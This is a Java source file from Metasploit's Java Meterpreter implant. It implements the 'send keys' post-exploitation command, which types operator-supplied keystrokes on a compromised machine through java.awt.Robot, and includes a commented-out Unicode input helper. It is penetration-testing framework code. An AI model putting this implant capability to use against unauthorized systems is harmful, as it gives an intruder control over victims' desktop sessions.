package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.awt.Robot;

public class stdapi_ui_send_keys_V1_4 extends stdapi_ui_send_keys implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String keyString = request.getStringValue(TLVType.TLV_TYPE_KEYS_SEND);
        pressKeyString(keyString);
        return ERROR_SUCCESS;
    }

    private void pressKeyString(String keyString) throws Exception {
        Robot robot = new Robot();
        for (int i=0;i<keyString.length();i++) {
            int keyCode = keyString.charAt(i);
            robot.keyPress(keyCode);
            robot.keyRelease(keyCode);
        }
    }

    /*
    private void pressUnicode(Robot r, int key_code)
    {
        r.keyPress(KeyEvent.VK_ALT);
        for(int i = 3; i >= 0; --i)
        {
            // extracts a single decade of the key-code and adds
            // an offset to get the required VK_NUMPAD key-code
            int numpad_kc = key_code / (int) (Math.pow(10, i)) % 10 + KeyEvent.VK_NUMPAD0;
            r.keyPress(numpad_kc);
            r.keyRelease(numpad_kc);
        }
        r.keyRelease(KeyEvent.VK_ALT);
    }
 */
}
